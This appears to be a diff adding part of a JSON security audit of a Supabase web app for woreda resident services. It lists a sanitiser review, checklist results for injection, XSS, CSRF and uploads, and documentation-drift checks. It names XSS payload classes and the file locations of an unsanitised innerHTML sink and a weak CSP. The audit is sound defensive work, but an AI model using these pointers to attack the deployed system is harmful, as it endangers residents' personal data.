+        { "path": "src/lib/letterTemplate.ts", "line": 87, "snippet": ".filter((d) => d && ALLOWED_STYLES.has(d.split(\":\")[0]!.trim().toLowerCase()))  // property allow-listed, value not" },
+        { "path": "docs/audit/2026-09-24/raw/appsec-sanitiser-fuzz.txt", "line": 10, "snippet": "text-align:left\\3b background:url(...) retained verbatim (inert in CSS; escaped ';' does not end a declaration)" },
+        { "path": "src/routes/woreda.services.$requestId.index.tsx", "line": 296, "snippet": "issued_letter_html: issuedHtml || null,  // client-rendered snapshot; no reader renders it today" }
+      ],
+      "description": "A manual review of sanitizeLetterHtml plus 16 jsdom payloads (mXSS via svg/math/noscript/template/table foster-parenting, comment breakouts, entity-obfuscated javascript: URLs, event handlers, base/form/style injection, token-in-attribute breakout) found no browser-side bypass. The design helps: disallowed elements are collapsed to text nodes, only 29 HTML-namespace tags survive, hrefs are scheme-allow-listed after entity decoding, and token values are escaped after sanitisation. The remaining observations are hardening items. (a) The non-DOMParser fallback strips only five tags and would pass <img onerror> if ever called server-side. It is unreachable today because every route sets ssr:false. (b) Style values are not validated. (c) issued_letter_html is client-produced, client-mutable (WP-APP-002) and unread, which makes it a latent sink if a future screen renders it raw.",
+      "attack_scenario": "",
+      "impact": "None today. These are regression risks.",
+      "recommendation": "Replace the walker with DOMPurify configured to the same allow-list (DOMPurify is already a transitive dependency via jspdf; pin it as a direct dependency). Make the fallback return escaped text, not partially-stripped HTML. Validate style values against an enum (left|right|center|justify, bold|normal, italic|normal, underline|none). Always re-sanitise issued_letter_html on read.",
+      "secure_fix_example": "import DOMPurify from 'dompurify';\nexport const sanitizeLetterHtml = (h: string) => DOMPurify.sanitize(h, { ALLOWED_TAGS: [...], ALLOWED_ATTR: ['href','target','rel','colspan','rowspan','style'], ALLOWED_URI_REGEXP: /^(https?:|mailto:|tel:)/i });",
+      "effort": "S",
+      "status": "Open"
+    }
+  ],
+  "checklist": [
+    {
+      "id": "C-01",
+      "status": "PARTIAL",
+      "evidence": "raw/appsec-injection-scan.txt; src/routes/woreda.residents.index.tsx:191; supabase/migrations/* (0 dynamic EXECUTE); every format() call is a RAISE message builder (e.g. 00000000000031_rental_eligibility.sql:157)",
+      "note": "No SQL injection surface: no dynamic SQL in any of the 90 migrations, RPCs use typed parameters, Edge Functions use supabase-js builders. Sort columns are allow-list mapped (SORT_COLUMN / sortColumn switch). Fails the literal criterion because 8 .or() filter strings interpolate partially escaped search input (WP-APP-006, Low, RLS-bounded)."
+    },
+    {
+      "id": "C-02",
+      "status": "FAIL",
+      "evidence": "src/components/ui/rich-text-editor.tsx:46; src/components/settings/LetterTemplatesTab.tsx:71; src/lib/security-headers.ts:52; raw/appsec-xss-sinks.txt",
+      "note": "4 HTML sinks: print route, preview and chart style are sanitised or unused. RichTextEditor assigns DB HTML to innerHTML unsanitised (WP-APP-001, stored XSS). The CSP is not strict ('unsafe-inline', WP-APP-003). A hand-rolled sanitiser is used instead of DOMPurify, though no bypass was found (WP-APP-010). No bindPopup, eval, document.write or javascript: href sinks. QR-decoded text and public verification pages render through React text nodes."
+    },
+    {
+      "id": "C-03",
+      "status": "N/A",
+      "evidence": "src/integrations/supabase/client.ts:24 (localStorage session); src/integrations/supabase/auth-attacher.ts (Authorization: Bearer); rg createServerFn src -> none; supabase/functions/_shared/response.ts:28-36 (Origin allow-list, no cookies read); src/components/ui/sidebar.tsx:86 (only cookie = UI state)",
+      "note": "The auth transport is a bearer JWT in the Authorization header, which the browser never attaches automatically. There are no cookie-authenticated endpoints, no TanStack server functions, and no Edge Function reads cookies. CSRF therefore has no ambient credential to ride on. The trade-off is that tokens are readable by XSS (see C-04 / WP-APP-003)."
+    },
+    {
+      "id": "C-06",
+      "status": "FAIL",
+      "evidence": "src/lib/residentSchema.ts:36; src/lib/phoneNumber.ts:70; supabase/migrations/00000000000000_baseline.sql:597 (only PII format CHECK); no FAN/phone CHECK or FAN unique index in any migration",
+      "note": "Enum/status columns are DB-enforced (44 named ADD CONSTRAINT CHECKs plus inline ones), and 14 forms use Zod. FAN (16 digits), phone (+251) and household email are client-only, FAN uniqueness is advisory, free-text lengths are unbounded in the DB, and Edge Function bodies are presence-checked only (WP-APP-005, WP-APP-009)."
+    },
+    {
+      "id": "C-07",
+      "status": "PARTIAL",
+      "evidence": "supabase/functions/*/index.ts catch blocks -> safeError(); src/lib/error-page.ts (generic); src/routes/__root.tsx:37-72 (generic ErrorComponent); WP-BQ-001 (128 raw error.message toasts); src/routes/login.tsx:100 (raw GoTrue message)",
+      "note": "PASS elements: all 8 Edge Functions return fixed strings via safeError() and log server-side, SSR crashes render a generic page, and there is no console.log of PII or tokens in src/ (only console.error of Error objects). FAIL element: direct PostgREST/RPC errors (constraint names, RLS text, trigger RAISE text) are shown verbatim in 128 toasts (WP-BQ-001, not duplicated here), and login shows raw GoTrue text (auth agent)."
+    },
+    {
+      "id": "C-08",
+      "status": "FAIL",
+      "evidence": "raw/appsec-uploads.txt; supabase/migrations/00000000000001_storage.sql:24-50; 00000000000072_rental_phase1_integrity_hardening.sql:262; src/components/forms/ResidentWizardSteps.tsx:207; src/components/settings/UsersRolesTab.tsx:732",
+      "note": "PASS: all 10 buckets private, reads through signed URLs, per-woreda path-prefix RLS (TEN-06), and 7 of 11 upload paths use UUID or timestamp object names. FAIL: 8 of 10 buckets have no server MIME/size limits, SVG or any type is accepted on 2 paths, extensions come from client filenames, there is no magic-byte check and no malware scanning (WP-APP-004), and storage permissions are not role-gated (WP-DB-002)."
+    },
+    {
+      "id": "D-02",
+      "status": "PARTIAL",
+      "evidence": "docs/security-functionality.md:34-61",
+      "note": "An 'Input validation strategy' section exists but is platform-level, not per module, and overstates the DB layer: it says 'consistently applied' although FAN, phone and household email have no DB constraint, and it says payment.amount '> 0' although the constraint has been '>= 0' since migration 59. The Services, Rental occupancy, Settings (letter templates, invites) and Edge Function inputs are not covered."
+    }
+  ],
+  "drift": [
+    { "claim": "letterTemplate.ts owns an allow-list sanitiser (tags, attributes and inline style properties); template HTML is operator-authored but still untrusted, and it renders into the print surface", "source": "CLAUDE.md (Service requests and issued letters)", "verdict": "CONTRADICTED", "evidence": "Sanitiser and print-path use CONFIRMED (woreda.services.$requestId.print.tsx:81; fuzz raw/appsec-sanitiser-fuzz.txt), but the same untrusted HTML is rendered unsanitised into the live DOM by the template editor (rich-text-editor.tsx:46 via LetterTemplatesTab.tsx:71)." },
+    { "claim": "Snapshots the rendered letter + summary so the public QR page can show it", "source": "src/routes/woreda.services.$requestId.index.tsx:252 (code comment)", "verdict": "CONTRADICTED", "evidence": "The snapshot is client-rendered and remains editable after issuance (00046:166 early return; no freeze trigger). The print route ignores it and re-renders from the live template (print.tsx:77)." },
+    { "claim": "resident-documents is the one bucket that validates upload constraints at the bucket level rather than client-side only", "source": "CLAUDE.md (Storage)", "verdict": "CONTRADICTED", "evidence": "rental-request-documents also has bucket-level limits since supabase/migrations/00000000000072_rental_phase1_integrity_hardening.sql:262-265." },
+    { "claim": "Nine buckets, all private", "source": "CLAUDE.md (Storage)", "verdict": "CONTRADICTED", "evidence": "10 buckets are created in migrations (00001 x7, 00004, 00014, 00048). All 10 are private, which is CONFIRMED." },
+    { "claim": "All 7 storage buckets private", "source": "docs/security-hardening.md:38", "verdict": "CONTRADICTED", "evidence": "10 buckets (see above). The privacy part is correct." },
+    { "claim": "Existing call sites all follow `${woredaId}/${crypto.randomUUID()}.${ext}` (or a stable field name for settings assets)", "source": "CLAUDE.md (Storage)", "verdict": "CONTRADICTED", "evidence": "service-request-documents uses `${woredaId}/${id}/${Date.now()}-${originalName}` (woreda.services.new.tsx:287, services.$requestId.index.tsx:379). Rental uses `${woredaId}/${rid}/${key}-${Date.now()}.${ext}` (occupants.new.tsx:359)." },
+    { "claim": "Both layers are allow-list validation (enums, regex, explicit type/format) ... consistently applied", "source": "docs/security-functionality.md:34-61", "verdict": "CONTRADICTED", "evidence": "No DB constraint on FAN/phone/household email, and several forms lack Zod (WP-APP-005)." },
+    { "claim": "payment.amount and rental_occupancy.rent_amount both require > 0", "source": "docs/security-functionality.md:56-57", "verdict": "CONTRADICTED", "evidence": "supabase/migrations/00000000000059_task14a_civil_payment_and_preconditions.sql:36 redefines payment_amount_check as amount >= 0." },
+    { "claim": "Zod schemas via React Hook Form used in 14 route files", "source": "docs/security-functionality.md:39", "verdict": "CONFIRMED", "evidence": "rg -l zodResolver src -> exactly the 14 files listed." },
+    { "claim": "Why CSRF tokens are correctly absent: bearer token in an explicit header, no Set-Cookie", "source": "docs/security-functionality.md (Session & cookie logic)", "verdict": "CONFIRMED", "evidence": "client.ts:24 localStorage; auth-attacher.ts; no createServerFn; only cookie is sidebar UI state (sidebar.tsx:86)." },
+    { "claim": "withSecurityHeaders applies HSTS, a scoped CSP, X-Frame-Options SAMEORIGIN, Permissions-Policy (camera/geolocation self), nosniff/referrer-policy to every document response", "source": "CLAUDE.md (Build and server entry); docs/security-hardening.md:17-27", "verdict": "CONFIRMED", "evidence": "src/lib/security-headers.ts:48-104 and src/server.ts:46-52. Code-level only. Live deployment headers are not verified." },
+    { "claim": "CSP still blocks ... the common injection paths after XSS", "source": "src/lib/security-headers.ts:33-35 (comment)", "verdict": "CONTRADICTED", "evidence": "'unsafe-inline' permits inline handlers, and navigation exfiltration is not governed by connect-src (WP-APP-003)." },
+    { "claim": "safeError() keeps the real error server-side ... a new Edge Function error path should call safeError()", "source": "CLAUDE.md (Edge Function errors)", "verdict": "CONFIRMED", "evidence": "All 8 index.ts outer catch blocks return safeError(...) with fixed strings." },
+    { "claim": "CSV formula injection guard (prefix = + - @ tab CR)", "source": "src/utils/tableExport.ts:22-33; src/utils/reportExport.ts:17-20", "verdict": "CONFIRMED", "evidence": "Implemented in both modules and used by all 13 CSV exports. Residual CR/';' gap noted in WP-APP-007." },
+    { "claim": "There are no loaders, no beforeLoad guards and no server functions (createServerFn) anywhere in src/routes", "source": "CLAUDE.md (Data layer)", "verdict": "CONFIRMED", "evidence": "rg createServerFn src -> only a comment in client.server.ts:35." }
+  ],
+  "artifacts": [
+    "docs/audit/2026-09-24/raw/appsec-sanitiser-fuzz.txt",
+    "docs/audit/2026-09-24/raw/appsec-sanitiser-fuzz.ts.txt",
+    "docs/audit/2026-09-24/raw/appsec-csv-escape.txt",
+    "docs/audit/2026-09-24/raw/appsec-csv-escape.ts.txt",
+    "docs/audit/2026-09-24/raw/appsec-xss-sinks.txt",
+    "docs/audit/2026-09-24/raw/appsec-injection-scan.txt",
+    "docs/audit/2026-09-24/raw/appsec-uploads.txt",
+    "docs/audit/2026-09-24/raw/appsec-mass-assignment.txt"
+  ]
+}
